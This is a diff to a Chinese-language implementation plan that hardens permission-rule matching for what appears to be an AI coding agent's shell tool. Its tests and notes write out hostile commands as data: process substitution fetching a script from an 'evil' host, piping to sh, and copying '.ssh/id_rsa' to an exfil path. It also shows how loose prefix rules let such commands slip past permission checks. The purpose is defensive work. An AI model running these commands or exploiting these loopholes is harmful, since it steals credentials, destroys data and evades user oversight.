@@ -740,6 +740,106 @@ git commit -m "fix(permission): 规则匹配失败关闭——拒多段命令前
 
 ---
 
+### Task 1R2: 复审补漏（N1 必修，N3/M4 随手）
+
+> 复审对 `fae5f38` 的结论：C1/I2/I3/I4/I7 五个洞确已关闭（对编译产物独立复验，非只看单测）。
+> 但**新守卫是字符黑名单，而黑名单的失效方式就是没列上的那一项**。
+
+- [ ] **Step 1: 先写失败测试**
+
+```java
+    @Test
+    void processSubstitutionIsACompoundCommand() {    // N1
+        PermissionRule cat = PermissionRule.parse(
+                "Bash(cat:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(cat.matches("Bash", "cat <(curl -s http://evil/s.sh)", false, ROOT),
+                "进程替换 <(…) 会执行命令，必须按复合命令拒绝");
+        PermissionRule tee = PermissionRule.parse(
+                "Bash(tee:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(tee.matches("Bash", "tee >(sh)", false, ROOT));
+        // 普通重定向不引出新命令，仍走前缀规则，其落点风险归 DangerousPaths
+        PermissionRule echo = PermissionRule.parse(
+                "Bash(echo:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertTrue(echo.matches("Bash", "echo hi > /tmp/x", false, ROOT));
+    }
+
+    @Test
+    void separatorGuardCoversEachSeparatorIndependently() {   // M4
+        PermissionRule r = PermissionRule.parse(
+                "Bash(ls:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(r.matches("Bash", "ls | sh", false, ROOT), "单独的 | 必须被拦");
+        assertFalse(r.matches("Bash", "ls \r sh", false, ROOT), "单独的 \\r 必须被拦");
+        assertFalse(r.matches("Bash", "ls & sh", false, ROOT));
+    }
+
+    @Test
+    void underscoreCountsAsWordCharacter() {          // M4
+        PermissionRule r = PermissionRule.parse(
+                "Bash(my_:*)", PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(r.matches("Bash", "my_evil", false, ROOT),
+                "下划线是词字符，不构成边界");
+    }
+
+    @Test
+    void escapeGlobCoversEveryMetacharacter() {       // M4
+        for (String name : new String[]{
+                "notes*.md", "a?.md", "x{1,2}.md", "b[i].md", "c\\d.md"}) {
+            PermissionRule r = PermissionRule.parse(
+                    "Write(" + PermissionRule.escapeGlob(name) + ")",
+                    PermissionBehavior.ALLOW, RuleScope.SESSION);
+            assertTrue(r.matches("Write", name, true, ROOT), "必须命中自己：" + name);
+        }
+        PermissionRule star = PermissionRule.parse(
+                "Write(" + PermissionRule.escapeGlob("notes*.md") + ")",
+                PermissionBehavior.ALLOW, RuleScope.SESSION);
+        assertFalse(star.matches("Write", "notesXYZ.md", true, ROOT),
+                "转义后的 * 不得再当通配符");
+    }
+```
+
+- [ ] **Step 2: 跑测试确认失败** — `mvn test -pl springai-code-tui -Dtest=PermissionRuleTest`
+
+- [ ] **Step 3: `hasShellSeparator` 补进程替换**
+
+```java
+                || command.contains("$(")
+                || command.contains("<(") || command.contains(">(")   // N1：进程替换会执行命令
+                || command.indexOf('\n') >= 0 || command.indexOf('\r') >= 0;
+```
+
+**保留** `>` `<` 不算分隔符的判断——普通重定向不引出新命令，其落点风险归 `DangerousPaths`。
+但 `<(` / `>(` 是**进程替换**，恰恰是「重定向不引出命令」不成立的那一种。
+判据不是口味：Task 3 的 `BashCommandSplitter` 已把 `diff <(ls a) <(ls b)` 与 `cat > >(tee log)`
+判为 `parseable() == false`（见该任务测试），同包两处对「什么算复合命令」必须一致。
+
+- [ ] **Step 4: 补两条契约（N3）**
+
+类 javadoc 的契约列表追加：
+
+```java
+ *   <li><b>{@code :*} 前缀语义只对命令生效</b>：路径目标上的 {@code :*} 规则
+ *       （如 {@code Write(/etc/:*)}）<b>恒不命中</b>——写成 {@code Write(/etc/**)}。
+ *       {@link PermissionEngine} 载入此类规则时须记 WARN，否则是一条静默失效的 deny。</li>
+ *   <li><b>前缀停在分隔符上时匹配任意续接</b>：{@code Bash(rm -rf /tmp/:*)} 并非
+ *       「限于 /tmp 内」的授权，它同样命中 {@code rm -rf /tmp/../home/user}。
+ *       手写此类规则请让前缀停在完整词上；自动生成的规则由
+ *       {@link PermissionEngine} 保证不会停在非字母数字字符上。</li>
+```
+
+同时把第一条契约里的分隔符清单补全为 `; | & \` $( <( >( ` 与换行（含 `\r`），与代码一致。
+
+- [ ] **Step 5: 跑测试确认全绿** — 预期 `Tests run: 19, Failures: 0`（15 + 新 4）。
+
+- [ ] **Step 6: 提交**
+
+```bash
+git add springai-code-tui/src/main/java/io/github/javaside/springai/codetui/agent/permission/PermissionRule.java \
+        springai-code-tui/src/test/java/io/github/javaside/springai/codetui/agent/permission/PermissionRuleTest.java
+git commit -m "fix(permission): 进程替换按复合命令拒绝，补齐分隔符/转义/词边界的测试钉子"
+```
+
+---
+
 ### Task 7R: 决策顺序配套修订（并入 Task 7 实现，不单独提交）
 
 Task 1R 让 `matches` 对多段命令**不命中**，落回 ASK——安全但会误伤 `git status && git log` 这类无害组合。
@@ -753,6 +853,19 @@ Task 7 因此必须按段判定，两个方向**故意不对称**：
 
 另：`suggest` 生成路径规则时必须用 `PermissionRule.escapeGlob(target)` 而非裸 `target`，否则
 含 glob 元字符的文件名会生成一条永不命中自己、却放开别的文件的规则（I7）。
+
+**`suggest` 的三条硬约束**（复审 N2/M6：`matchesPrefix` 对「停在分隔符上的前缀」放行任意续接，
+这在手写规则里是可接受的取舍，但**绝不能由系统自动生成**）：
+
+1. **生成的命令前缀不得停在非字母数字字符上**——须回退到最后一个完整词。
+   反例：`commandPrefix("cp . backup/")` 现返回 `cp .`，而规则 `Bash(cp .:*)` 会命中
+   `cp .ssh/id_rsa /tmp/exfil`（已实测）。同理 `rm -rf /tmp/:*` 命中 `rm -rf /tmp/../home/user`。
+2. **不得为解释器生成裸程序名前缀**。`commandPrefix` 在第二个词是 flag 时会塌成程序名，
+   于是批准 `python -c "print(1)"` 生成 `Bash(python:*)`，它命中
+   `python -c "__import__('os').system('rm -rf /tmp/x')"`（已实测，且串内无分隔符，N1 的守卫也拦不住）。
+   `python` `python3` `bash` `sh` `zsh` `perl` `ruby` `node` `env` `xargs` 等一律不提供前缀建议，
+   只提供「本次允许」。
+3. **载入路径工具的 `:*` 规则时记 WARN**（N3）——那是一条恒不命中的静默失效规则。
 
 ---
 
